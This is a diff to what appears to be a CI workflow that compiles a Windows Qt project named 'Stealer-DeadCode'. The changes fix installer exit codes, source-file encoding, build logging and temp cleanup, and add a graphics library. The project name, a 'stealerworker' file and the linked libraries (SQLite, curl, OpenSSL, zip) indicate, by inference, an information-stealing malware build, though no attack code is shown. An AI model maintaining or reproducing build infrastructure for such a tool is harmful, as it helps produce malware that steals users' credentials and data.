@@ -90,7 +90,7 @@ jobs:
         }
         Write-Host "Installing MinGW via Chocolatey..."
         choco install mingw -y --force
-        if ($LASTEXITCODE -ne 0) {
+        if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
           Write-Host "Error: Failed to install MinGW via Chocolatey"
           exit 1
         }
@@ -207,14 +207,21 @@ jobs:
         Write-Host "Project structure verified"
       shell: powershell
 
-    # Шаг 12: Исправление кодировки icon.rc
-    - name: Fix icon.rc encoding
+    # Шаг 12: Исправление кодировки исходных файлов
+    - name: Fix encoding of source files
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode
-        Write-Host "Fixing encoding of icon.rc..."
-        $content = Get-Content -Path icon.rc -Raw -Encoding UTF8
-        Set-Content -Path icon.rc -Value $content -NoNewline -Encoding ASCII
-        Write-Host "icon.rc encoding fixed to ASCII"
+        Write-Host "Fixing encoding of source files..."
+        $files = @("src\main.cpp", "ui\mainwindow.cpp", "ui\mainwindow.h", "src\stealerworker.h", "icon.rc")
+        foreach ($file in $files) {
+          if (Test-Path $file) {
+            $content = Get-Content -Path $file -Raw -Encoding UTF8
+            Set-Content -Path $file -Value $content -NoNewline -Encoding UTF8
+            Write-Host "Fixed encoding for $file to UTF-8 without BOM"
+          } else {
+            Write-Host "Warning: $file not found"
+          }
+        }
       shell: powershell
 
     # Шаг 13: Генерация UI-файлов
@@ -253,16 +260,17 @@ jobs:
         
         Set-Location build
         Write-Host "Running qmake..."
-        qmake ..\ui\DeadCode.pro CONFIG+=release QMAKE_INCDIR+="C:\vcpkg\installed\x64-mingw-dynamic\include" QMAKE_LIBDIR+="C:\vcpkg\installed\x64-mingw-dynamic\lib" LIBS+="-lsqlite3 -lcurl -lssl -lcrypto -lzip -lbz2 -lz" DEFINES+="BUILD_DATE=\\\"$buildDate\\\"" DEFINES+="BUILD_VERSION=\\\"$buildVersion\\\""
+        qmake ..\ui\DeadCode.pro CONFIG+=release QMAKE_INCDIR+="C:\vcpkg\installed\x64-mingw-dynamic\include" QMAKE_LIBDIR+="C:\vcpkg\installed\x64-mingw-dynamic\lib" LIBS+="-lsqlite3 -lcurl -lssl -lcrypto -lzip -lbz2 -lz -lgdiplus" DEFINES+="BUILD_DATE=\\\"$buildDate\\\"" DEFINES+="BUILD_VERSION=\\\"$buildVersion\\\""
         if ($LASTEXITCODE -ne 0) {
           Write-Host "Error: qmake failed"
           exit 1
         }
         
         Write-Host "Running mingw32-make..."
-        mingw32-make -f Makefile.Release -j4
+        mingw32-make -f Makefile.Release -j4 2>&1 | Tee-Object -FilePath make.log
         if ($LASTEXITCODE -ne 0) {
-          Write-Host "Error: mingw32-make failed"
+          Write-Host "Error: mingw32-make failed. Full log:"
+          Get-Content -Path make.log
           exit 1
         }
         
@@ -392,4 +400,5 @@ jobs:
       if: always()
       run: |
         Remove-Item -Path "$env:GITHUB_WORKSPACE\Stealer-DeadCode\build" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "C:\Temp\DeadCode_*" -Recurse -Force -ErrorAction SilentlyContinue
       shell: powershell
